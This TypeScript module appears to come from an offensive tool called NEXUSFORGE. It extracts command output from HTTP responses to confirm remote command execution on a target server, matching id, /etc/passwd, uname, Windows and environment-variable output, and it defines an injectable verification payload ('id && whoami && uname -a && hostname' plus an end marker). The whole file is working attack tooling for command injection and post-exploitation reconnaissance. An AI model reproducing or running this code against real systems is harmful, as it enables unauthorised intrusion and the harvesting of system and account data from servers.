/* ═══════════════════════════════════════════════════════════════
   NEXUSFORGE — Command Output Extractor
   Parses raw HTTP response bodies and pulls out real command output.
   Four strategies in priority order:
     1. Marker-based  — ===NEXUS_OUTPUT_END=== injected by user
     2. Pattern-based — regex anchored to known RCE signatures
     3. Differential  — lines present in injected response but not baseline
     4. Raw-HTML      — patterns found before HTML stripping (attributes, comments)
   ═══════════════════════════════════════════════════════════════ */

export const NEXUS_MARKER = "===NEXUS_OUTPUT_END===";

export interface ExtractionResult {
  text:       string;
  method:     string;
  confidence: "high" | "medium";
}

/* ── HTML → plain-text ──────────────────────────────────────── */
const ENTITY: Record<string, string> = {
  "&amp;": "&", "&lt;": "<", "&gt;": ">", "&quot;": '"',
  "&#39;": "'", "&apos;": "'", "&#x27;": "'",
  "&nbsp;": " ", "&#xa;": "\n", "&#10;": "\n", "&#13;": "\r",
};

export function stripHtml(html: string): string {
  return html
    .replace(/<br\s*\/?>/gi, "\n")
    .replace(/<\/(?:p|div|li|tr|td|th|h[1-6]|pre|code|blockquote|section|article|header|footer|main)>/gi, "\n")
    .replace(/<!--[\s\S]*?-->/g, "")          // strip HTML comments
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/<[^>]+>/g, "")
    .replace(/&[a-zA-Z#x0-9]+;/g, m => ENTITY[m.toLowerCase()] ?? m)
    .replace(/\r\n/g, "\n")
    .replace(/[ \t]+\n/g, "\n")
    .replace(/\n{3,}/g, "\n\n")
    .trim();
}

/* ── RCE signature patterns ─────────────────────────────────── */
interface Pattern { re: RegExp; name: string; hi: boolean; ctx: number }

const RCE_PATTERNS: Pattern[] = [
  { re: /uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)[^\n]*/,                       name: "id",          hi: true,  ctx: 25 },
  { re: /root:x:0:0:[^\n]*/,                                                  name: "passwd",      hi: true,  ctx: 20 },
  { re: /^[a-z_][a-z0-9_-]{0,31}:x:\d+:\d+:[^:]*:[^:]*:[^\n]+$/m,          name: "passwd-line", hi: true,  ctx: 10 },
  { re: /Linux\s+\S+\s+\d+\.\d+\.\d+[^\n]*/,                                name: "uname",       hi: true,  ctx: 10 },
  { re: /Microsoft Windows \[Version [^\]]+\]/,                               name: "winver",      hi: true,  ctx: 10 },
  { re: /\bNT AUTHORITY\\\w+/,                                                name: "winid",       hi: true,  ctx: 10 },
  { re: /(?:^|\n)(PATH=\/[^\n]{4,})/m,                                       name: "env-PATH",    hi: false, ctx: 15 },
  { re: /(?:^|\n)(HOME=\/[^\n]{2,})/m,                                       name: "env-HOME",    hi: false, ctx: 15 },
  { re: /(?:^|\n)(USER=\w{1,32})\s*$/m,                                      name: "env-USER",    hi: false, ctx: 15 },
  { re: /(?:^|\n)(SHELL=\/[^\n]{4,})/m,                                      name: "env-SHELL",   hi: false, ctx: 12 },
  { re: /drwxr[-x][-x]\s+\d+\s+\w+\s+\w+[^\n]*/,                           name: "ls",          hi: false, ctx: 20 },
  { re: /total \d+\n(?:[-drwx]{10}[^\n]*\n?){1,}/m,                         name: "ls-l",        hi: false, ctx: 25 },
  { re: /inet\s+\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\/\d+[^\n]*/,           name: "ifconfig",    hi: false, ctx: 15 },
  { re: /^\s*\d+\s+\S+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\d+\s+\S+/m,      name: "ps",          hi: false, ctx: 15 },
  { re: /\bPS [A-Za-z]:\\.+>/,                                               name: "ps-prompt",   hi: true,  ctx: 10 },
  { re: /Volume Serial Number is [0-9A-F]{4}-[0-9A-F]{4}/i,                 name: "dir-win",     hi: true,  ctx: 15 },
  { re: /OS Name:\s+Microsoft Windows/i,                                      name: "systeminfo",  hi: true,  ctx: 20 },
];

/* Raw-HTML patterns — match before stripping, for output embedded in
   HTML attributes, comments, or echo'd without escaping */
const RAW_PATTERNS: RegExp[] = [
  /uid=\d+\([^)]+\)\s+gid=\d+/,
  /root:x:0:0:/,
  /Linux \S+ \d+\.\d+\.\d+/,
  /Microsoft Windows \[Version \d/,
  /\bNT AUTHORITY\\\w+/,
];

/* ── Core extraction ────────────────────────────────────────── */
export function extractCommandOutput(
  body:         string,
  baselineBody?: string,
): ExtractionResult | null {

  const plain = stripHtml(body);

  /* ── 1. Marker-based ──────────────────────────────────────── */
  const mIdx = plain.indexOf(NEXUS_MARKER);
  if (mIdx !== -1) {
    const before = plain.slice(0, mIdx).trim();
    const lines  = before.split("\n").filter(l => l.trim().length > 0);
    if (lines.length > 0) {
      return {
        text:       lines.slice(-80).join("\n").trim().slice(0, 4096),
        method:     "marker",
        confidence: "high",
      };
    }
  }

  /* ── 2. Pattern-based on stripped HTML ──────────────────────── */
  for (const { re, name, hi, ctx } of RCE_PATTERNS) {
    const m = plain.match(re);
    if (!m || !m[0]) continue;

    const hitIdx = plain.indexOf(m[0]);
    if (hitIdx === -1) continue;

    const allLines = plain.split("\n");
    const lineNum  = plain.slice(0, hitIdx).split("\n").length - 1;
    const start    = Math.max(0, lineNum - 2);
    const end      = Math.min(allLines.length, lineNum + ctx);
    const chunk    = allLines.slice(start, end)
      .filter(l => l.trim().length > 0)
      .join("\n")
      .trim();

    if (chunk.length > 0) {
      return {
        text:       chunk.slice(0, 4096),
        method:     name,
        confidence: hi ? "high" : "medium",
      };
    }
  }

  /* ── 3. Differential — new lines not in baseline ──────────── */
  if (baselineBody && baselineBody.length > 50) {
    const basePlain = stripHtml(baselineBody);
    const baseLines = new Set(
      basePlain.split("\n").map(l => l.trim()).filter(l => l.length > 4),
    );
    const newLines = plain
      .split("\n")
      .map(l => l.trim())
      .filter(l => l.length > 0 && !baseLines.has(l));

    if (newLines.length > 0) {
      const joined = newLines.join("\n");
      // Only accept differential if the new content contains RCE signatures
      const hasSig = RCE_PATTERNS.some(({ re }) => re.test(joined))
        || /uid=\d+|root:x:|Linux \S+ \d|PATH=\/|HOME=\//.test(joined);

      if (hasSig) {
        return {
          text:       newLines.slice(0, 100).join("\n").trim().slice(0, 4096),
          method:     "differential",
          confidence: "high",
        };
      }
    }
  }

  /* ── 4. Raw-HTML patterns (pre-strip) ─────────────────────── */
  for (const re of RAW_PATTERNS) {
    const m = body.match(re);
    if (!m || !m[0]) continue;
    const idx   = body.indexOf(m[0]);
    const chunk = stripHtml(body.slice(Math.max(0, idx - 80), idx + 400)).trim();
    if (chunk.length > 0) {
      return { text: chunk.slice(0, 4096), method: "raw-html", confidence: "high" };
    }
  }

  return null;
}

/* ── Verification payload ───────────────────────────────────── */
export const VERIFY_PAYLOAD =
  `id && whoami && uname -a && hostname && echo '${NEXUS_MARKER}'`;
